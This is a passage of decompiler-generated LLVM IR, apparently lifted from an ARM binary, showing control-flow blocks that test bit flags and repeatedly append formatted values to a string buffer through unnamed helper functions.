dec_label_pc_8838:                                ; preds = %dec_label_pc_9510, %dec_label_pc_9950, %dec_label_pc_9a98, %dec_label_pc_9914, %dec_label_pc_8830, %dec_label_pc_87f4, %dec_label_pc_8858, %dec_label_pc_9d84, %dec_label_pc_9b34, %dec_label_pc_9a7c, %dec_label_pc_9934, %dec_label_pc_965c, %dec_label_pc_9400, %dec_label_pc_88dc, %dec_label_pc_98fc, %dec_label_pc_9884
  store i32 %v0_839c, i32* %r3.global-to-local, align 4
  %v1_8840 = add i32 %stack_var_-20832.0, 1
  store i32 %v1_8840, i32* %r2.global-to-local, align 4
  %v0_8844 = load i32, i32* @r8, align 4
  %v2_8848 = sub i32 %v1_8840, %v0_839c
  %v3_8848 = icmp uge i32 %v1_8840, %v0_839c
  store i1 %v3_8848, i1* %cpsr_c.global-to-local, align 1
  %v4_8848 = xor i32 %v1_8840, %v0_839c
  %v5_8848 = xor i32 %v2_8848, %v1_8840
  %v6_8848 = and i32 %v5_8848, %v4_8848
  %v7_8848 = icmp slt i32 %v6_8848, 0
  store i1 %v7_8848, i1* %cpsr_v.global-to-local, align 1
  %v8_8848 = icmp slt i32 %v2_8848, 0
  store i1 %v8_8848, i1* %cpsr_n.global-to-local, align 1
  %v9_8848 = icmp eq i32 %v1_8840, %v0_839c
  store i1 %v9_8848, i1* %cpsr_z.global-to-local, align 1
  %v1_8850 = add i32 %v0_8844, 3140
  store i32 %v1_8850, i32* @r8, align 4
  br i1 %v9_8848, label %dec_label_pc_8528, label %dec_label_pc_8858

dec_label_pc_8858:                                ; preds = %dec_label_pc_8838, %dec_label_pc_87e8
  %v0_8860 = phi i32 [ %stack_var_-20868.0.ph, %dec_label_pc_87e8 ], [ %v1_8850, %dec_label_pc_8838 ]
  %stack_var_-20832.0 = phi i32 [ %v1_87dc, %dec_label_pc_87e8 ], [ %v1_8840, %dec_label_pc_8838 ]
  %v1_8858 = add i32 %v0_8860, -1456
  %v2_8858 = inttoptr i32 %v1_8858 to i32*
  %v3_8858 = load i32, i32* %v2_8858, align 4
  store i32 %v3_8858, i32* %r0.global-to-local, align 4
  %v1_885c = add i32 %v3_8858, 1
  %v2_885c = icmp eq i32 %v3_8858, -1
  store i1 %v2_885c, i1* %cpsr_c.global-to-local, align 1
  %v3_885c = sub i32 0, %v3_8858
  %v4_885c = and i32 %v1_885c, %v3_885c
  %v5_885c = icmp slt i32 %v4_885c, 0
  store i1 %v5_885c, i1* %cpsr_v.global-to-local, align 1
  %v6_885c = icmp slt i32 %v1_885c, 0
  store i1 %v6_885c, i1* %cpsr_n.global-to-local, align 1
  %v7_885c = icmp eq i32 %v1_885c, 0
  store i1 %v7_885c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8858, i32* %sb.global-to-local, align 4
  br i1 %v7_885c, label %dec_label_pc_8838, label %dec_label_pc_8868

dec_label_pc_8868:                                ; preds = %dec_label_pc_8858
  %v3_8868 = udiv i32 %v3_8858, 32
  %v3_8870 = mul nuw nsw i32 %v3_8868, 4
  store i32 %v2_8748, i32* @lr, align 4
  %v2_8878 = add i32 %v3_8870, %v2_8748
  store i32 %v2_8878, i32* %r3.global-to-local, align 4
  %v1_887c = add i32 %v2_8878, -292
  %v2_887c = inttoptr i32 %v1_887c to i32*
  %v3_887c = load i32, i32* %v2_887c, align 4
  %v1_8880 = urem i32 %v3_8858, 32
  store i32 %v1_8880, i32* %r1.global-to-local, align 4
  %v2_8884 = add nsw i32 %v1_8880, -1
  %v3_8884 = shl i32 1, %v2_8884
  %v4_8884 = and i32 %v3_887c, %v3_8884
  %v5_8884 = icmp ne i32 %v4_8884, 0
  store i1 %v5_8884, i1* %cpsr_c.global-to-local, align 1
  %v6_8884 = lshr i32 %v3_887c, %v1_8880
  store i32 %v6_8884, i32* %r2.global-to-local, align 4
  %v1_8888 = urem i32 %v6_8884, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_8888 = icmp eq i32 %v1_8888, 0
  store i1 %v2_8888, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8888, label %dec_label_pc_87f4, label %dec_label_pc_8890

dec_label_pc_8890:                                ; preds = %dec_label_pc_8868
  store i32 4, i32* @r4, align 4
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_88a8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 4, i32* %stack_var_-48, align 4
  store i32 %v2_88b4, i32* @lr, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v6_88c0 = call i32 @function_13644(i32 %v3_8858, i32 1, i32 4, i32* nonnull %stack_var_-44, i32 %v2_88b4)
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_88c8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_88c8, i32* %r3.global-to-local, align 4
  %v2_88cc = or i32 %v3_88c8, %v6_88c0
  store i32 %v2_88cc, i32* %r0.global-to-local, align 4
  %v3_88cc = icmp slt i32 %v2_88cc, 0
  store i1 %v3_88cc, i1* %cpsr_n.global-to-local, align 1
  %v4_88cc = icmp eq i32 %v2_88cc, 0
  store i1 %v4_88cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_88cc, label %.thread38, label %dec_label_pc_88dc

.thread38:                                        ; preds = %dec_label_pc_8890
  %v1_88d0 = load i32, i32* @r8, align 4
  %v2_88d0 = add i32 %v1_88d0, -1456
  %v3_88d0 = inttoptr i32 %v2_88d0 to i32*
  %v4_88d0 = load i32, i32* %v3_88d0, align 4
  store i32 %v4_88d0, i32* %r0.global-to-local, align 4
  %v1_88d4 = load i32, i32* @r4, align 4
  %v2_88d4 = trunc i32 %v1_88d4 to i8
  %v4_88d4 = add i32 %v1_88d0, -1452
  %v5_88d4 = inttoptr i32 %v4_88d4 to i8*
  store i8 %v2_88d4, i8* %v5_88d4, align 1
  %v0_88d8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_88d8.pr.pr, label %.thread38.dec_label_pc_87f4_crit_edge, label %dec_label_pc_88dc

.thread38.dec_label_pc_87f4_crit_edge:            ; preds = %.thread38
  %v0_87f4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_87f4

dec_label_pc_88dc:                                ; preds = %dec_label_pc_8890, %.thread38
  %v0_88dc = load i32, i32* @r8, align 4
  %v1_88dc = add i32 %v0_88dc, -1456
  %v2_88dc = inttoptr i32 %v1_88dc to i32*
  %v3_88dc = load i32, i32* %v2_88dc, align 4
  store i32 %v3_88dc, i32* %r0.global-to-local, align 4
  %v1_88e0 = call i32 @function_12e9c(i32 %v3_88dc)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_88e8 = load i32, i32* @r8, align 4
  %v2_88e8 = add i32 %v1_88e8, -1456
  %v3_88e8 = inttoptr i32 %v2_88e8 to i32*
  store i32 -1, i32* %v3_88e8, align 4
  %v0_88ec = load i32, i32* @r5, align 4
  %v1_88ec = trunc i32 %v0_88ec to i8
  %v2_88ec = load i32, i32* @r8, align 4
  %v3_88ec = add i32 %v2_88ec, -1452
  %v4_88ec = inttoptr i32 %v3_88ec to i8*
  store i8 %v1_88ec, i8* %v4_88ec, align 1
  br label %dec_label_pc_8838

dec_label_pc_88f4:                                ; preds = %dec_label_pc_8650
  %v1_88f4 = add i32 %v3_8900, 25
  %v2_88f4 = inttoptr i32 %v1_88f4 to i32*
  %v3_88f4 = load i32, i32* %v2_88f4, align 4
  store i32 %v3_88f4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_88f8 = icmp slt i32 %v3_88f4, 0
  store i1 %v1_88f8, i1* %cpsr_n.global-to-local, align 1
  %v2_88f8 = icmp eq i32 %v3_88f4, 0
  store i1 %v2_88f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_88f8, label %.thread43, label %.thread41

.thread41:                                        ; preds = %dec_label_pc_88f4
  store i32 4, i32* %r3.global-to-local, align 4
  store i8 4, i8* %v2_8650, align 1
  %v0_8904.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8904.pr.pr, label %.thread41..thread43_crit_edge, label %dec_label_pc_890c

.thread41..thread43_crit_edge:                    ; preds = %.thread41
  %v1_8904.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_8904.pre = load i32, i32* @r6, align 4
  %extract.t = trunc i32 %v1_8904.pre to i8
  br label %.thread43

.thread43:                                        ; preds = %.thread41..thread43_crit_edge, %dec_label_pc_88f4
  %v3_8904 = phi i32 [ %v3_8904.pre, %.thread41..thread43_crit_edge ], [ %v3_8900, %dec_label_pc_88f4 ]
  %v1_8904.off0 = phi i8 [ %extract.t, %.thread41..thread43_crit_edge ], [ 0, %dec_label_pc_88f4 ]
  %v4_8904 = add i32 %v3_8904, -1427
  %v5_8904 = inttoptr i32 %v4_8904 to i8*
  store i8 %v1_8904.off0, i8* %v5_8904, align 1
  %v0_8908.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8908.pr, label %.thread43.dec_label_pc_8664_crit_edge, label %dec_label_pc_890c

.thread43.dec_label_pc_8664_crit_edge:            ; preds = %.thread43
  %v0_8664.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8664

dec_label_pc_890c:                                ; preds = %.thread41, %.thread43, %dec_label_pc_85c0
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_8914 = load i32, i32* @r7, align 4
  %v1_8914 = add i32 %v0_8914, 2112
  store i32 %v1_8914, i32* %r0.global-to-local, align 4
  %v1_8918 = load i32, i32* @r6, align 4
  %v2_8918 = add i32 %v1_8918, 33
  %v3_8918 = inttoptr i32 %v2_8918 to i32*
  store i32 -1, i32* %v3_8918, align 4
  %v0_891c = load i32, i32* %r0.global-to-local, align 4
  %v1_891c = add i32 %v0_891c, 4
  store i32 %v1_891c, i32* %r0.global-to-local, align 4
  store i32 1024, i32* %r1.global-to-local, align 4
  %v0_8924 = load i32, i32* @r5, align 4
  %v1_8924 = load i32, i32* @r6, align 4
  %v2_8924 = add i32 %v1_8924, 21
  %v3_8924 = inttoptr i32 %v2_8924 to i32*
  store i32 %v0_8924, i32* %v3_8924, align 4
  %v2_8928 = call i32 @function_1257c(i32 %v1_891c, i32 1024)
  store i32 10240, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v0_8934 = load i32, i32* @r5, align 4
  %v1_8934 = load i32, i32* @r6, align 4
  %v2_8934 = add i32 %v1_8934, 681
  %v3_8934 = inttoptr i32 %v2_8934 to i32*
  store i32 %v0_8934, i32* %v3_8934, align 4
  %v2_8938 = call i32 @function_1257c(i32 %stack_var_-20856.0.ph, i32 10240)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8940 = call i32 @function_124dc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  %v0_8948 = load i32, i32* @r6, align 4
  store i32 %v0_8948, i32* %r1.global-to-local, align 4
  %v2_894c = add i32 %v2_8940, %stack_var_-20856.0.ph
  store i32 %v2_894c, i32* @r0, align 4
  %v2_8950 = inttoptr i32 %v2_894c to i8*
  %v3_8950 = call i32 @function_12504(i8* %v2_8950, i32 %v0_8948)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8958 = call i32 @function_124dc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15754.28 to i32), i32* %r1.global-to-local, align 4
  %v2_8964 = add i32 %v2_8958, %stack_var_-20856.0.ph
  store i32 %v2_8964, i32* @r0, align 4
  %v2_8968 = inttoptr i32 %v2_8964 to i8*
  %v3_8968 = call i32 @function_12504(i8* %v2_8968, i32 ptrtoint (i32* @global_var_15754.28 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8970 = call i32 @function_124dc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  %v0_8978 = load i32, i32* @r7, align 4
  %v1_8978 = add i32 %v0_8978, 532
  store i32 %v1_8978, i32* %r1.global-to-local, align 4
  %v2_897c = add i32 %v2_8970, %stack_var_-20856.0.ph
  store i32 %v2_897c, i32* @r0, align 4
  %v2_8980 = inttoptr i32 %v2_897c to i8*
  %v3_8980 = call i32 @function_12504(i8* %v2_8980, i32 %v1_8978)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8988 = call i32 @function_124dc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1572c.30 to i32), i32* %r1.global-to-local, align 4
  %v2_8994 = add i32 %v2_8988, %stack_var_-20856.0.ph
  store i32 %v2_8994, i32* @r0, align 4
  %v3_8998 = inttoptr i32 %v2_8994 to i8*
  %v4_8998 = call i32 @function_12504(i8* %v3_8998, i32 ptrtoint ([24 x i8]* @global_var_1572c.30 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_89a0 = call i32 @function_124dc(i8* %v1_8940)
  %v2_89a8 = add i32 %v2_89a0, %stack_var_-20856.0.ph
  store i32 %v2_89a8, i32* @r0, align 4
  %v0_89ac = load i32, i32* @r7, align 4
  %v1_89ac = add i32 %v0_89ac, 20
  store i32 %v1_89ac, i32* %r1.global-to-local, align 4
  %v2_89b0 = inttoptr i32 %v2_89a8 to i8*
  %v3_89b0 = call i32 @function_12504(i8* %v2_89b0, i32 %v1_89ac)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_89b8 = call i32 @function_124dc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_15744.32 to i32), i32* %r1.global-to-local, align 4
  %v2_89c4 = add i32 %v2_89b8, %stack_var_-20856.0.ph
  store i32 %v2_89c4, i32* @r0, align 4
  %v3_89c8 = inttoptr i32 %v2_89c4 to i8*
  %v4_89c8 = call i32 @function_12504(i8* %v3_89c8, i32 ptrtoint ([9 x i8]* @global_var_15744.32 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_89d0 = call i32 @function_124dc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  %v0_89d8 = load i32, i32* @r7, align 4
  %v2_89dc = add i32 %v2_89d0, %stack_var_-20856.0.ph
  store i32 %v2_89dc, i32* @r0, align 4
  %v1_89e0 = add i32 %v0_89d8, 789
  store i32 %v1_89e0, i32* %r1.global-to-local, align 4
  %v2_89e4 = inttoptr i32 %v2_89dc to i8*
  %v3_89e4 = call i32 @function_12504(i8* %v2_89e4, i32 %v1_89e0)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_89ec = call i32 @function_124dc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r1.global-to-local, align 4
  %v2_89f8 = add i32 %v2_89ec, %stack_var_-20856.0.ph
  store i32 %v2_89f8, i32* @r0, align 4
  %v3_89fc = inttoptr i32 %v2_89f8 to i8*
  %v4_89fc = call i32 @function_12504(i8* %v3_89fc, i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32))
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_8a04 = call i32 @function_11c08(i32 32)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a0c = call i32 @function_124dc(i8* %v1_8940)
  %v0_8a10 = load i32, i32* @r5, align 4
  store i32 %v0_8a10, i32* %r1.global-to-local, align 4
  store i32 %v2_8a0c, i32* @r4, align 4
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_8a1c = inttoptr i32 %v0_8a10 to i32*
  %v3_8a1c = call i32 @function_11b24(i32 32, i32* %v2_8a1c)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 %v3_8a1c, i32* %r1.global-to-local, align 4
  %v1_8a28 = load i32, i32* @r4, align 4
  %v2_8a28 = add i32 %v1_8a28, %stack_var_-20856.0.ph
  store i32 %v2_8a28, i32* @r0, align 4
  %v2_8a2c = inttoptr i32 %v2_8a28 to i8*
  %v3_8a2c = call i32 @function_12504(i8* %v2_8a2c, i32 %v3_8a1c)
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_8a34 = call i32 @function_11b50(i32 32)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a3c = call i32 @function_124dc(i8* %v1_8940)
  %v2_8a44 = add i32 %v2_8a3c, %stack_var_-20856.0.ph
  store i32 %v2_8a44, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r1.global-to-local, align 4
  %v3_8a4c = inttoptr i32 %v2_8a44 to i8*
  %v4_8a4c = call i32 @function_12504(i8* %v3_8a4c, i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32))
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_8a54 = call i32 @function_11c08(i32 33)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a5c = call i32 @function_124dc(i8* %v1_8940)
  %v0_8a60 = load i32, i32* @r5, align 4
  store i32 %v0_8a60, i32* %r1.global-to-local, align 4
  store i32 %v2_8a5c, i32* @r4, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v2_8a6c = inttoptr i32 %v0_8a60 to i32*
  %v3_8a6c = call i32 @function_11b24(i32 33, i32* %v2_8a6c)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8a6c, i32* %r1.global-to-local, align 4
  %v1_8a78 = load i32, i32* @r4, align 4
  %v2_8a78 = add i32 %v1_8a78, %stack_var_-20856.0.ph
  store i32 %v2_8a78, i32* @r0, align 4
  %v2_8a7c = inttoptr i32 %v2_8a78 to i8*
  %v3_8a7c = call i32 @function_12504(i8* %v2_8a7c, i32 %v3_8a6c)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_8a84 = call i32 @function_11b50(i32 33)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a8c = call i32 @function_124dc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r1.global-to-local, align 4
  %v2_8a98 = add i32 %v2_8a8c, %stack_var_-20856.0.ph
  store i32 %v2_8a98, i32* @r0, align 4
  %v3_8a9c = inttoptr i32 %v2_8a98 to i8*
  %v4_8a9c = call i32 @function_12504(i8* %v3_8a9c, i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32))
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_8aa4 = call i32 @function_11c08(i32 34)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8aac = call i32 @function_124dc(i8* %v1_8940)
  %v0_8ab0 = load i32, i32* @r5, align 4
  store i32 %v0_8ab0, i32* %r1.global-to-local, align 4
  store i32 %v2_8aac, i32* @r4, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  %v2_8abc = inttoptr i32 %v0_8ab0 to i32*
  %v3_8abc = call i32 @function_11b24(i32 34, i32* %v2_8abc)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_8abc, i32* %r1.global-to-local, align 4
  %v1_8ac8 = load i32, i32* @r4, align 4
  %v2_8ac8 = add i32 %v1_8ac8, %stack_var_-20856.0.ph
  store i32 %v2_8ac8, i32* @r0, align 4
  %v2_8acc = inttoptr i32 %v2_8ac8 to i8*
  %v3_8acc = call i32 @function_12504(i8* %v2_8acc, i32 %v3_8abc)
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_8ad4 = call i32 @function_11b50(i32 34)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8adc = call i32 @function_124dc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r1.global-to-local, align 4
  %v2_8ae8 = add i32 %v2_8adc, %stack_var_-20856.0.ph
  store i32 %v2_8ae8, i32* @r0, align 4
  %v3_8aec = inttoptr i32 %v2_8ae8 to i8*
  %v4_8aec = call i32 @function_12504(i8* %v3_8aec, i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32))
  store i32 %v4_8aec, i32* %r0.global-to-local, align 4
  store i32 %v6_8200, i32* %r1.global-to-local, align 4
  %v1_8af4 = load i32, i32* @r5, align 4
  %v2_8af4 = sub i32 %v6_8200, %v1_8af4
  %v3_8af4 = icmp uge i32 %v6_8200, %v1_8af4
  store i1 %v3_8af4, i1* %cpsr_c.global-to-local, align 1
  %v4_8af4 = xor i32 %v1_8af4, %v6_8200
  %v5_8af4 = xor i32 %v2_8af4, %v6_8200
  %v6_8af4 = and i32 %v5_8af4, %v4_8af4
  %v7_8af4 = icmp slt i32 %v6_8af4, 0
  store i1 %v7_8af4, i1* %cpsr_v.global-to-local, align 1
  %v8_8af4 = icmp slt i32 %v2_8af4, 0
  store i1 %v8_8af4, i1* %cpsr_n.global-to-local, align 1
  %v9_8af4 = icmp eq i32 %v6_8200, %v1_8af4
  store i1 %v9_8af4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8af4, label %dec_label_pc_8bcc, label %dec_label_pc_8afc

dec_label_pc_8afc:                                ; preds = %dec_label_pc_890c
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_8b00 = call i32 @function_11c08(i32 35)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b08 = call i32 @function_124dc(i8* %v1_8940)
  %v0_8b0c = load i32, i32* @r5, align 4
  store i32 %v0_8b0c, i32* %r1.global-to-local, align 4
  store i32 %v2_8b08, i32* @r4, align 4
  store i32 35, i32* %r0.global-to-local, align 4
  %v2_8b18 = inttoptr i32 %v0_8b0c to i32*
  %v3_8b18 = call i32 @function_11b24(i32 35, i32* %v2_8b18)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8b18, i32* %r1.global-to-local, align 4
  %v1_8b24 = load i32, i32* @r4, align 4
  %v2_8b24 = add i32 %v1_8b24, %stack_var_-20856.0.ph
  store i32 %v2_8b24, i32* @r0, align 4
  %v2_8b28 = inttoptr i32 %v2_8b24 to i8*
  %v3_8b28 = call i32 @function_12504(i8* %v2_8b28, i32 %v3_8b18)
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_8b30 = call i32 @function_11b50(i32 35)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b38 = call i32 @function_124dc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r1.global-to-local, align 4
  %v2_8b44 = add i32 %v2_8b38, %stack_var_-20856.0.ph
  store i32 %v2_8b44, i32* @r0, align 4
  %v3_8b48 = inttoptr i32 %v2_8b44 to i8*
  %v4_8b48 = call i32 @function_12504(i8* %v3_8b48, i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b50 = call i32 @function_124dc(i8* %v1_8940)
  %v0_8b54 = load i32, i32* @r5, align 4
  store i32 %v0_8b54, i32* %r1.global-to-local, align 4
  store i32 %v2_8b50, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v2_8b60 = inttoptr i32 %v0_8b54 to i32*
  %v3_8b60 = call i32 @function_11b24(i32 40, i32* %v2_8b60)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_8b60, i32* %r1.global-to-local, align 4
  %v2_8b6c = add i32 %v2_8b50, %stack_var_-20856.0.ph
  store i32 %v2_8b6c, i32* @r0, align 4
  %v2_8b70 = inttoptr i32 %v2_8b6c to i8*
  %v3_8b70 = call i32 @function_12504(i8* %v2_8b70, i32 %v3_8b60)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b78 = call i32 @function_124dc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_15754.28 to i32), i32* %r1.global-to-local, align 4
  %v2_8b84 = add i32 %v2_8b78, %stack_var_-20856.0.ph
  store i32 %v2_8b84, i32* @r0, align 4
  %v2_8b88 = inttoptr i32 %v2_8b84 to i8*
  %v3_8b88 = call i32 @function_12504(i8* %v2_8b88, i32 ptrtoint (i32* @global_var_15754.28 to i32))
  store i32 %v6_8200, i32* %r0.global-to-local, align 4
  %v2_8b90 = call i32 @function_124dc(i8* %v1_8b90)
  store i32 %v2_8b90, i32* @r4, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b9c = call i32 @function_124dc(i8* %v1_8940)
  %v2_8ba4 = add i32 %v2_8b9c, %stack_var_-20856.0.ph
  store i32 %v2_8ba4, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v0_8bac = load i32, i32* @r4, align 4
  store i32 %v0_8bac, i32* %r0.global-to-local, align 4
  %v3_8bb0 = trunc i32 %v0_8bac to i8
  %v4_8bb0 = call i32 @function_129d0(i8 %v3_8bb0, i32 10, i32 %v2_8ba4)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8bb8 = call i32 @function_124dc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32), i32* %r1.global-to-local, align 4
  %v2_8bc4 = add i32 %v2_8bb8, %stack_var_-20856.0.ph
  store i32 %v2_8bc4, i32* @r0, align 4
  %v3_8bc8 = inttoptr i32 %v2_8bc4 to i8*
  %v4_8bc8 = call i32 @function_12504(i8* %v3_8bc8, i32 ptrtoint ([3 x i8]* @global_var_15750.34 to i32))
  store i32 %v4_8bc8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8bcc

dec_label_pc_8bcc:                                ; preds = %dec_label_pc_890c, %dec_label_pc_8afc
  %v0_8bcc = load i32, i32* @r6, align 4
  %v1_8bcc = add i32 %v0_8bcc, 37
  %v2_8bcc = inttoptr i32 %v1_8bcc to i32*
  %v3_8bcc = load i32, i32* %v2_8bcc, align 4
  store i32 %v3_8bcc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_8bd0 = icmp slt i32 %v3_8bcc, 0
  store i1 %v1_8bd0, i1* %cpsr_n.global-to-local, align 1
  %v2_8bd0 = icmp eq i32 %v3_8bcc, 0
  store i1 %v2_8bd0, i1* %cpsr_z.global-to-local, align 1
  %tmp208 = icmp slt i32 %v3_8bcc, 1
  br i1 %tmp208, label %dec_label_pc_8c78, label %dec_label_pc_8bd8

dec_label_pc_8bd8:                                ; preds = %dec_label_pc_8bcc
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8bdc = call i32 @function_124dc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_15764.36 to i32), i32* %r1.global-to-local, align 4
  %v2_8be8 = add i32 %v2_8bdc, %stack_var_-20856.0.ph
  store i32 %v2_8be8, i32* @r0, align 4
  %v3_8bec = inttoptr i32 %v2_8be8 to i8*
  %v4_8bec = call i32 @function_12504(i8* %v3_8bec, i32 ptrtoint ([9 x i8]* @global_var_15764.36 to i32))
  store i32 %v4_8bec, i32* %r0.global-to-local, align 4
  %v0_8bf0 = load i32, i32* @r6, align 4
  %v1_8bf0 = add i32 %v0_8bf0, 37
  %v2_8bf0 = inttoptr i32 %v1_8bf0 to i32*
  %v3_8bf0 = load i32, i32* %v2_8bf0, align 4
  store i32 %v3_8bf0, i32* %r3.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_8bf8 = icmp slt i32 %v3_8bf0, 0
  store i1 %v1_8bf8, i1* %cpsr_n.global-to-local, align 1
  %v2_8bf8 = icmp eq i32 %v3_8bf0, 0
  store i1 %v2_8bf8, i1* %cpsr_z.global-to-local, align 1
  %v0_8bfc = load i32, i32* @r5, align 4
  store i32 %v0_8bfc, i32* %stack_var_-40, align 4
  %tmp209 = icmp slt i32 %v3_8bf0, 1
  br i1 %tmp209, label %dec_label_pc_8c60, label %dec_label_pc_8c04

dec_label_pc_8c04:                                ; preds = %dec_label_pc_8bd8, %dec_label_pc_8c04
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8c08 = call i32 @function_124dc(i8* %v1_8940)
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_8c10 = load i32, i32* %stack_var_-40, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
